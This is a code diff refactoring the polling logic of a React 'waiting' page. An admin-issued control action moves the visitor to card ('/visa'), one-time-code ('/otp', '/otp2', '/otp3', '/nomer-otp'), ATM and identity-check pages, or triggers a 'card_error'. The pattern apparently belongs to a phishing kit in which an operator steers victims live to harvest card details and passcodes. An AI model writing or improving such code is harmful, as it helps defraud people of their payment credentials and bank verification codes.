@@ -1,7 +1,6 @@
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
-import { useQuery } from "@tanstack/react-query";
-import { getControlAction } from "@/lib/api";
+import { getControlAction, consumeControlAction } from "@/lib/api";
 import { Header } from "@/components/layout/Header";
 import { Loader2, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
@@ -11,69 +10,87 @@ export default function WaitingPage() {
   const [, setLocation] = useLocation();
   const [errorType, setErrorType] = useState<string | null>(null);
   const isRedirecting = useRef(false);
+  const pollIntervalRef = useRef<number | null>(null);
   
   // Get sessionId on mount
   const sessionId = localStorage.getItem("sessionId");
   
-  // Check for control messages from admin
-  const { data: controlData, refetch } = useQuery({
-    queryKey: ["control", sessionId],
-    queryFn: async () => {
-      console.log("WaitingPage: Checking control for sessionId:", sessionId);
-      const result = await getControlAction(sessionId!);
-      console.log("WaitingPage: Control result:", result);
-      return result;
-    },
-    refetchInterval: 1000,
-    enabled: !!sessionId && !isRedirecting.current,
-  });
-
-  // Handle admin control - determine where to redirect
+  // Poll for control messages from admin
+  const checkForControl = useCallback(async () => {
+    if (!sessionId || isRedirecting.current) return;
+    
+    try {
+      const result = await getControlAction(sessionId);
+      
+      if (result && result.action) {
+        console.log("WaitingPage: Got action:", result.action);
+        
+        // Stop polling
+        if (pollIntervalRef.current) {
+          clearInterval(pollIntervalRef.current);
+          pollIntervalRef.current = null;
+        }
+        
+        // Consume the action so it won't be sent again
+        await consumeControlAction(sessionId);
+        
+        // Handle card error
+        if (result.action === "card_error") {
+          setErrorType("card_error");
+          isRedirecting.current = true;
+          return;
+        }
+        
+        // Map actions to pages
+        const pageMap: Record<string, string> = {
+          go_home: "/",
+          go_form: "/form",
+          go_select: "/select",
+          go_visa: "/visa",
+          go_otp: "/otp",
+          go_otp2: "/otp2",
+          go_otp3: "/otp3",
+          go_atm: "/atm",
+          go_nomer: "/nomer",
+          go_nomer_wait: "/nomer-wait",
+          go_nomer_otp: "/nomer-otp",
+          go_identity_check: "/identity-check",
+          go_total: "/total",
+          go_total2: "/total2",
+          go_waiting: "/waiting",
+        };
+        
+        const targetPage = pageMap[result.action];
+        if (targetPage) {
+          console.log("WaitingPage: Redirecting to:", targetPage);
+          isRedirecting.current = true;
+          setTimeout(() => {
+            setLocation(targetPage);
+          }, 100);
+        }
+      }
+    } catch (error) {
+      console.error("WaitingPage: Error checking control:", error);
+    }
+  }, [sessionId, setLocation]);
+  
+  // Start polling on mount
   useEffect(() => {
-    if (!controlData || !controlData.action || isRedirecting.current) {
-      console.log("WaitingPage: No action or redirecting");
-      return;
+    if (sessionId && !isRedirecting.current) {
+      // Check immediately
+      checkForControl();
+      
+      // Then poll every second
+      pollIntervalRef.current = window.setInterval(checkForControl, 1000);
     }
     
-    const action = controlData.action;
-    console.log("WaitingPage: Got action:", action);
-    
-    // Check for error actions first
-    if (action === "card_error") {
-      console.log("WaitingPage: Showing card error");
-      setErrorType("card_error");
-      isRedirecting.current = true;
-      return;
-    }
-    
-    // Map actions to pages
-    const pageMap: Record<string, string> = {
-      go_home: "/",
-      go_form: "/form",
-      go_select: "/select",
-      go_visa: "/visa",
-      go_otp: "/otp",
-      go_otp2: "/otp2",
-      go_otp3: "/otp3",
-      go_atm: "/atm",
-      go_nomer: "/nomer",
-      go_nomer_wait: "/nomer-wait",
-      go_nomer_otp: "/nomer-otp",
-      go_identity_check: "/identity-check",
-      go_total: "/total",
-      go_total2: "/total2",
-      go_waiting: "/waiting",
+    return () => {
+      if (pollIntervalRef.current) {
+        clearInterval(pollIntervalRef.current);
+        pollIntervalRef.current = null;
+      }
     };
-    
-    const targetPage = pageMap[action];
-    if (targetPage) {
-      console.log("WaitingPage: Redirecting to:", targetPage);
-      isRedirecting.current = true;
-      setTimeout(() => {
-        setLocation(targetPage);
-      }, 100);
-    }
-  }, [controlData, setLocation]);
+  }, [sessionId, checkForControl]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
@@ -107,6 +124,8 @@ export default function WaitingPage() {
                 onClick={() => {
                   setErrorType(null);
                   isRedirecting.current = false;
+                  // Restart polling
+                  pollIntervalRef.current = window.setInterval(checkForControl, 1000);
                   setLocation("/visa");
                 }}
                 className="rounded-2xl bg-primary px-6 py-3 text-sm font-semibold text-white hover:bg-primary/90"
